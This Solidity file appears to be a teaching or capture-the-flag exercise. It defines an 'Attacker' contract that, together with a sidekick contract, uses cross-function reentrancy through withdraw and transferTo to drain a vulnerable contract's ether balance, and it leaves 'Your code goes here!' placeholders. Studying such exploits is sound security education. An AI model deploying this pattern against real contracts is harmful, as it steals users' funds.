// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

interface IVulnerable {
    function withdraw() external;

    function deposit() external payable;

    function transferTo(address _recipient, uint _amount) external;

    function userBalance(address user) external view returns (uint256);
}

interface ISidekick {
    function exploit() external payable;
}

contract Attacker {
    IVulnerable public target;
    ISidekick public sidekick;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    function setSidekick(address _sidekick) public {
        sidekick = ISidekick(_sidekick);
    }

    receive() external payable {
        //? The 1 ether amount is for simplicity. If we have the `userBlance`
        //? interface, it coule be more precise.
        target.transferTo(address(sidekick), 1 ether);
        /*
            Your code goes here!
        */
    }

    function exploit() public payable {
        if (target.userBalance(address(this)) == 0) {
            uint collected_money = 0;
            uint target_inital_balance = address(target).balance;
            while (collected_money < target_inital_balance) {
                target.deposit{value: 1 ether}();
                target.withdraw();
                collected_money += 1 ether;
            }
            sidekick.exploit();
        } else {
            target.withdraw();
        }

        /*
            Your code goes here!
        */
    }
}
